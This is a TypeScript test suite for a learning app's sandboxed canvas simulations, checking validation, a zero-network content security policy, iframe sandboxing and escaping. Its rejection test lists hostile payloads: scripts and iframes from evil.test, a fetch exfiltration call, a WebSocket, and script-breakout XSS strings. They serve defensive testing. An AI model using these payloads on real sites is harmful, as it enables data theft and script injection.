import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  buildCanvasSimSrcDoc,
  buildStandaloneCanvasHtml,
  CANVAS_INNER_CSP,
  CANVAS_MAX_HEIGHT,
  CANVAS_MIN_HEIGHT,
  INITIAL_CANVAS_BRIDGE_STATE,
  reduceCanvasBridgeState,
  renderLatexInCanvasHtml,
  validateCanvasSim,
} from "../canvasSim";
import { detectCanvasVendors } from "../canvasVendors";
import {
  deriveSchematicFromLegacyItems,
  validateConceptDiagram,
} from "../conceptDiagram";
import { extractVisualExample, validateVisualExample } from "../visuals";
import { analyzeDiagramTopology } from "../../../components/learning/ConceptSchematicGraph";
import { VisualExample } from "../../../components/learning/VisualExample";
import { MarkdownView } from "../../../components/chat/MarkdownView";

const waveCanvasVisual = {
  kind: "canvas" as const,
  title: "Wave Superposition Lab",
  summary:
    "Two sine waves add point-by-point; shifting phase from 0° to 180° moves from constructive to destructive interference.",
  canvas: {
    controlsHint: "Drag the phase offset slider from 0° to 180°.",
    height: 300,
    html: `<canvas id="wave" width="560" height="200"></canvas>
<div class="controls">
  <label>Phase <strong id="phaseOut">0°</strong>
    <input id="phase" type="range" min="0" max="180" value="0">
  </label>
</div>`,
    js: `const { ctx, width, height } = window.setupForgeCanvas("wave", 200);
const slider = document.getElementById("phase");
const out = document.getElementById("phaseOut");
function draw() {
  const deg = Number(slider.value);
  out.textContent = deg + "°";
  const rad = (deg * Math.PI) / 180;
  ctx.clearRect(0, 0, width, height);
  ctx.strokeStyle = window.FORGE_THEME.accent;
  ctx.lineWidth = 2;
  ctx.beginPath();
  for (let x = 0; x < width; x++) {
    const k = (x / width) * Math.PI * 4;
    const y = height / 2 - 36 * (Math.sin(k) + Math.sin(k + rad));
    if (x === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
  }
  ctx.stroke();
}
slider.addEventListener("input", draw);
draw();`,
  },
  items: [
    {
      id: "in-phase",
      label: "0° phase offset (constructive)",
      description: "Peaks align with peaks, doubling the combined amplitude.",
    },
    {
      id: "out-of-phase",
      label: "180° phase offset (destructive)",
      description:
        "Peaks align with troughs of equal size, cancelling to a flat line.",
    },
  ],
  takeaway:
    "Superposition adds displacements at every point: phase alignment governs whether waves reinforce or cancel.",
};

describe("sandboxed interactive canvas simulation contract", () => {
  it("validates structured kind='canvas' visuals and extracts forge-visual blocks", () => {
    const validated = validateVisualExample(waveCanvasVisual);
    expect(validated).not.toBeNull();
    expect(validated?.kind).toBe("canvas");
    expect(validated?.canvas?.height).toBe(300);
    expect(validated?.canvas?.controlsHint).toContain("phase offset");

    const extracted = extractVisualExample(
      `Try shifting the phase below.\n\`\`\`forge-visual\n${JSON.stringify(
        waveCanvasVisual
      )}\n\`\`\``
    );
    expect(extracted).toEqual(validated);
  });

  it("normalizes single-file full HTML documents passed in html or code", () => {
    const singleDoc = validateCanvasSim({
      code: `<!doctype html>
<html>
<head><style>.box { color: #cfb292; }</style></head>
<body>
  <canvas id="boids" width="500" height="240"></canvas>
  <button id="reset" type="button">Scatter</button>
  <script>
    const c = document.getElementById("boids");
    const ctx = c.getContext("2d");
    ctx.fillRect(10, 10, 40, 40);
  </script>
</body>
</html>`,
      height: 999,
    });
    expect(singleDoc).not.toBeNull();
    expect(singleDoc?.css).toContain(".box");
    expect(singleDoc?.html).toContain('<canvas id="boids"');
    expect(singleDoc?.html).not.toContain("<script>");
    expect(singleDoc?.js).toContain('getContext("2d")');
    expect(singleDoc?.height).toBe(640); // clamped to max 640
  });

  it("rejects external scripts, network exfiltration APIs, nested frames, and non-interactive markup", () => {
    const badPayloads = [
      // External CDN script tag
      {
        html: '<canvas id="c"></canvas><script src="https://cdn.evil.test/x.js"></script>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // External stylesheet link
      {
        html: '<link rel="stylesheet" href="https://evil.test/a.css"><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Attempted CSP meta override
      {
        html: '<meta http-equiv="Content-Security-Policy" content="default-src *"><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Nested iframe
      {
        html: '<iframe src="https://evil.test"></iframe><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Outbound fetch exfiltration
      {
        html: '<canvas id="c"></canvas>',
        js: 'fetch("https://evil.test/steal?x=1");',
      },
      // Outbound WebSocket
      {
        html: '<canvas id="c"></canvas>',
        js: 'const ws = new WebSocket("wss://evil.test");',
      },
      // Outbound XMLHttpRequest
      {
        html: '<canvas id="c"></canvas>',
        js: 'const xhr = new XMLHttpRequest();',
      },
      // Plain static prose with no interactive or canvas surface
      {
        html: "<p>Just a static paragraph with nothing to manipulate.</p>",
        js: "const a = 1 + 2; console.log(a);",
      },
    ];

    for (const bad of badPayloads) {
      expect(validateCanvasSim(bad)).toBeNull();
    }
  });

  it("injects strict zero-network CSP first in srcDoc and escapes closing script/style breakouts", () => {
    const spec = validateCanvasSim({
      html: '<canvas id="c"></canvas>',
      css: ".note::after { content: '</style><script>evil()</script>'; }",
      js: 'const label = "</script><img src=x onerror=evil()>"; const ctx = document.getElementById("c").getContext("2d");',
    })!;
    expect(spec).not.toBeNull();

    const srcDoc = buildCanvasSimSrcDoc(spec, "tok-123");
    expect(srcDoc).toContain(CANVAS_INNER_CSP);
    expect(srcDoc).toContain("connect-src 'none'");
    expect(srcDoc).toContain("default-src 'none'");
    // CSP meta must appear before any <script> tag
    expect(srcDoc.indexOf("Content-Security-Policy")).toBeLessThan(
      srcDoc.indexOf("<script>")
    );
    // Closing tag breakouts inside CSS/JS must be escaped
    expect(srcDoc).toContain("<\\/style>");
    expect(srcDoc).toContain("<\\/script>");
    expect(srcDoc).toContain("window.setupForgeCanvas");
    expect(srcDoc).toContain('"tok-123"');
  });

  it("authenticates postMessage tokens and clamps resize heights in reduceCanvasBridgeState", () => {
    const token = "lf-valid-1";
    // Wrong token or wrong source is ignored completely
    expect(
      reduceCanvasBridgeState(
        INITIAL_CANVAS_BRIDGE_STATE,
        { source: "learnforge-canvas", token: "wrong", type: "error", message: "fake" },
        token
      )
    ).toBe(INITIAL_CANVAS_BRIDGE_STATE);

    expect(
      reduceCanvasBridgeState(
        INITIAL_CANVAS_BRIDGE_STATE,
        { source: "other", token, type: "interact" },
        token
      )
    ).toBe(INITIAL_CANVAS_BRIDGE_STATE);

    // Valid resize clamps low & high values
    const low = reduceCanvasBridgeState(
      INITIAL_CANVAS_BRIDGE_STATE,
      { source: "learnforge-canvas", token, type: "resize", height: 40 },
      token
    );
    expect(low.height).toBe(CANVAS_MIN_HEIGHT);

    const high = reduceCanvasBridgeState(
      low,
      { source: "learnforge-canvas", token, type: "resize", height: 4000 },
      token
    );
    expect(high.height).toBe(CANVAS_MAX_HEIGHT);

    // Valid interact + error transitions
    const interacted = reduceCanvasBridgeState(
      high,
      { source: "learnforge-canvas", token, type: "interact" },
      token
    );
    expect(interacted.interacted).toBe(true);

    const errored = reduceCanvasBridgeState(
      interacted,
      {
        source: "learnforge-canvas",
        token,
        type: "error",
        message: "ReferenceError: boidVelocity is not defined",
      },
      token
    );
    expect(errored.error).toBe("ReferenceError: boidVelocity is not defined");
  });

  it("renders zero-origin sandbox='allow-scripts' iframe (never allow-same-origin) with escaped text equivalent", () => {
    const validated = validateVisualExample({
      ...waveCanvasVisual,
      title: "Wave Lab <img src=x onerror=attack()>",
    })!;
    const markup = renderToStaticMarkup(
      <VisualExample visual={validated} visualId="wave-1" />
    );

    expect(markup).toContain('sandbox="allow-scripts"');
    expect(markup).not.toContain("allow-same-origin");
    expect(markup).toContain('referrerPolicy="no-referrer"');
    // Title XSS attempt is escaped in parent DOM
    expect(markup).toContain("&lt;img src=x onerror=attack()&gt;");
    expect(markup).not.toContain("<img src=x");
    // Guaranteed text equivalent remains present
    expect(markup).toContain("Read as text");
    expect(markup).toContain("180° phase offset (destructive)");
    expect(markup).toContain("Save HTML");
  });

  it("renders inline ```forge-canvas blocks in MarkdownView and hides incomplete streaming JSON gracefully", () => {
    const inlineBlock = [
      "Explore how phase governs interference:",
      "```forge-canvas",
      JSON.stringify({
        title: waveCanvasVisual.title,
        summary: waveCanvasVisual.summary,
        takeaway: waveCanvasVisual.takeaway,
        ...waveCanvasVisual.canvas,
      }),
      "```",
    ].join("\n");

    const rendered = renderToStaticMarkup(<MarkdownView content={inlineBlock} />);
    expect(rendered).toContain('sandbox="allow-scripts"');
    expect(rendered).not.toContain("allow-same-origin");
    expect(rendered).toContain("Wave Superposition Lab");

    // Incomplete mid-stream block shows calm status instead of dumping raw JS
    const streaming = "```forge-canvas\n{\"title\":\"Boids\",\"html\":\"<canvas";
    const pendingHtml = renderToStaticMarkup(<MarkdownView content={streaming} />);
    expect(pendingHtml).toContain("Preparing interactive simulation");
    expect(pendingHtml).not.toContain("<canvas");
  });

  it("builds standalone offline HTML export with escaped metadata and null bridge token", () => {
    const validated = validateVisualExample(waveCanvasVisual)!;
    const exported = buildStandaloneCanvasHtml(
      'Wave <script>alert("x")</script>',
      validated.canvas!,
      { summary: validated.summary, takeaway: validated.takeaway }
    );
    expect(exported).toContain(CANVAS_INNER_CSP);
    expect(exported).toContain("var TOKEN = null;");
    expect(exported).toContain("&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;");
    expect(exported).toContain("window.__forgeReportError");
    expect(exported).not.toContain('"use strict";');
  });

  it("typesets inline and display KaTeX inside canvas HTML without corrupting attributes or scripts", () => {
    const html = renderLatexInCanvasHtml(
      '<div class="formula-bar" data-price="$10">Loss: $L(w) = \\alpha w^2$</div><script>const x = "$notMath$";</script>'
    );
    expect(html).toContain("katex");
    expect(html).toContain('data-price="$10"');
    expect(html).toContain('const x = "$notMath$";');
  });

  it("detects offline 3D Three.js, D3, Rough.js, and dynamic KaTeX vendor usage", () => {
    expect(
      detectCanvasVendors(
        'const { THREE, scene } = window.setupForge3D("stage", 260);'
      )
    ).toEqual({ katex: false, rough: false, d3: false, three: true, any: true });

    expect(
      detectCanvasVendors(
        'd3.select("svg"); rough.canvas(c); katex.render("x^2", el);'
      )
    ).toEqual({ katex: true, rough: true, d3: true, three: false, any: true });
  });

  it("validates kind='diagram' schematics and automatically upgrades legacy code 'parts' into syntax-highlighted blueprints", () => {
    const diagramVisual = validateVisualExample({
      kind: "diagram",
      title: "Interface Contract vs Concrete Type",
      summary:
        "A concrete type satisfies `$\\text{Scorer}$` implicitly when its method set includes `Score() int`.",
      diagram: {
        direction: "LR",
        nodes: [
          {
            id: "contract",
            badge: "INTERFACE CONTRACT",
            label: "Scorer",
            formula: "\\tau \\models \\text{Scorer}",
            code: "type Scorer interface { Score() int }",
            detail: "Specifies required method signature `Score() int`.",
            tone: "accent",
          },
          {
            id: "guard",
            badge: "CONCRETE STRUCT",
            label: "Guard",
            code: "type Guard struct { Points int }",
            detail: "Provides field storage `Points int`.",
            tone: "blue",
          },
        ],
        edges: [{ from: "guard", to: "contract", label: "satisfies" }],
      },
      items: [
        {
          id: "i1",
          label: "Contract role",
          description: "Method set requirement `$\\operatorname{sig}(I)$`.",
        },
        {
          id: "i2",
          label: "Concrete struct",
          description: "Implements `Score() int` without `implements` keyword.",
        },
      ],
      takeaway: "Satisfaction is structural: `$\\text{Guard} \\models \\text{Scorer}$`.",
    });

    expect(diagramVisual).not.toBeNull();
    expect(validateConceptDiagram(diagramVisual?.diagram)).not.toBeNull();

    const html = renderToStaticMarkup(
      <VisualExample
        visual={diagramVisual!}
        visualId="diag-1"
        embedded
        language="go"
      />
    );
    expect(html).toContain("katex");
    expect(html).toContain("visual-code-chip");
    // Embedded mode omits the duplicate outer disclosure header
    expect(html).not.toContain("visual-disclosure");

    // Legacy 3-item Go interface "parts" automatically upgrades to CONTRACT / CONCRETE TYPE / IMPLEMENTATION edges
    const upgraded = deriveSchematicFromLegacyItems("parts", [
      {
        id: "p1",
        label: "type Scorer interface { Score() int }",
        description: "The contract.",
      },
      {
        id: "p2",
        label: "type Guard struct { Points int }",
        description: "The struct.",
      },
      {
        id: "p3",
        label: "func (g Guard) Score() int { return g.Points }",
        description: "The method.",
      },
    ]);
    expect(upgraded.direction).toBe("LR");
    expect(upgraded.nodes[0].formula).toBeUndefined();
    expect(upgraded.nodes.map((n) => n.badge)).toEqual([
      "CONTRACT",
      "CONCRETE TYPE",
      "IMPLEMENTATION",
    ]);
    expect(upgraded.edges.map((e) => e.label)).toEqual([
      "defines method",
      "satisfies",
    ]);

    // Out-of-order 4-node Go diagram topologically sorts into 01 -> 02 -> 03 -> 04 serpentine chain
    const fourNodeSpec = validateConceptDiagram({
      direction: "LR",
      nodes: [
        { id: "contract", label: "Shooter Role", badge: "INTERFACE CONTRACT", detail: "Contract" },
        { id: "guard", label: "Guard Value", badge: "CONCRETE TYPE", detail: "Struct" },
        { id: "method", label: "Value Receiver", badge: "METHOD SET", detail: "Receiver" },
        { id: "assign", label: "Implicit Binding", badge: "INTERFACE ASSIGNMENT", detail: "Assign" },
      ],
      edges: [
        { from: "guard", to: "method", label: "binds receiver" },
        { from: "method", to: "contract", label: "matches signature" },
        { from: "contract", to: "assign", label: "validates T |= I" },
      ],
    })!;
    const topo = analyzeDiagramTopology(fourNodeSpec);
    expect(topo.isChain).toBe(true);
    expect(topo.orderedNodes.map((n) => n.id)).toEqual([
      "guard",
      "method",
      "contract",
      "assign",
    ]);
  });
});
